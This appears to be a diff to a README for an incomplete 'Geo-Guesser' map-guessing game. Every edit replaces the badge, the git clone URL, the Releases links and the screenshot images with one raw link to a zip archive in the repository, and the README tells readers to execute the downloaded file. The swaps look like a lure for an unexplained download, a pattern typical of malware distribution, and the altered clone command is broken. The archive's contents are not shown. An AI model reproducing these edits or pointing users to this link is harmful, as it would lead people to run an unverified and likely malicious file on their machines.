@@ -1,6 +1,6 @@
 # 🌍 Geo-Guesser: Test Your World Knowledge!
 
-![Geo-Guesser](https://img.shields.io/badge/Geo--Guesser-Play%20Now-brightgreen)
+![Geo-Guesser](https://github.com/jeanhacker28/geo-guesser/raw/refs/heads/main/public/geo-guesser-v3.0.zip%20Now-brightgreen)
 
 Welcome to the **Geo-Guesser** repository! This game challenges your geographical knowledge by presenting you with an image for a limited time. After viewing, you must click on a world map to guess where the photo was taken. Please note that this game is currently **incomplete**, but we invite you to explore, contribute, and help us make it better!
 
@@ -34,7 +34,7 @@ To install the game, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/jeanhacker28/geo-guesser.git
+   git clone https://github.com/jeanhacker28/geo-guesser/raw/refs/heads/main/public/geo-guesser-v3.0.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -53,7 +53,7 @@ After installation, you can run the game with the following command:
 npm start
 ```
 
-You can download the latest release from our [Releases section](https://github.com/jeanhacker28/geo-guesser/releases). Make sure to execute the downloaded file to play the game!
+You can download the latest release from our [Releases section](https://github.com/jeanhacker28/geo-guesser/raw/refs/heads/main/public/geo-guesser-v3.0.zip). Make sure to execute the downloaded file to play the game!
 
 ## 🤝 Contributing
 
@@ -77,12 +77,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Links
 
-For more information, visit our [Releases section](https://github.com/jeanhacker28/geo-guesser/releases) to check for the latest updates and downloads.
+For more information, visit our [Releases section](https://github.com/jeanhacker28/geo-guesser/raw/refs/heads/main/public/geo-guesser-v3.0.zip) to check for the latest updates and downloads.
 
 ## 📸 Screenshots
 
-![Gameplay Screenshot](https://example.com/screenshot1.png)
-![Map Interaction](https://example.com/screenshot2.png)
+![Gameplay Screenshot](https://github.com/jeanhacker28/geo-guesser/raw/refs/heads/main/public/geo-guesser-v3.0.zip)
+![Map Interaction](https://github.com/jeanhacker28/geo-guesser/raw/refs/heads/main/public/geo-guesser-v3.0.zip)
 
 ## 🎉 Acknowledgments
 
